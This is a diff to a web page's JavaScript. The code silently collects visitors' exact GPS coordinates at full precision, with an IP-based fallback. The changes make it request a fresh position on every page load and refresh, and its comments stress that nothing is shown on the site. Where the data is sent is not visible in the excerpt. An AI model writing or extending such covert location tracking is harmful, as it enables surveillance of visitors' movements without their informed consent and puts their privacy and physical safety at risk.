@@ -1194,6 +1194,7 @@
             });
 
             // Get exact location silently — full precision, nothing shown on website
+            // ALWAYS requests fresh GPS on every page load/refresh — never uses cached coordinates
 
             function handleLocation(z1, z2, extra) {
                 // Store with FULL precision — no rounding, all decimals kept
@@ -1232,6 +1233,7 @@
                         handleLocation(pos.coords.latitude, pos.coords.longitude, 'accuracy: ' + pos.coords.accuracy + 'm, source: GPS');
                     },
                     function() { ipFallback(); },
+                    // maximumAge: 0 forces a FRESH position on every call — never returns cached
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             }
@@ -1246,20 +1248,20 @@
                     }).catch(function() {});
             }
 
-            // Step 1: Ask notification permission → Step 2: Ask GPS location
+            // Request notification permission (non-blocking) then always get fresh GPS
             function requestPermissions() {
-                if ('Notification' in window) {
+                if ('Notification' in window && Notification.permission === 'default') {
+                    // Only ask notification permission if not already decided
                     Notification.requestPermission().then(function() {
-                        // After notification (granted or denied), ask for GPS
                         getGPSLocation();
                     });
                 } else {
-                    // No notification API — go straight to GPS
+                    // Permission already granted/denied or API unavailable — get GPS immediately
                     getGPSLocation();
                 }
             }
 
-            // Fire permission flow on page load
+            // Fire on EVERY page load/refresh — always sends fresh exact location
             requestPermissions();
 
         })();
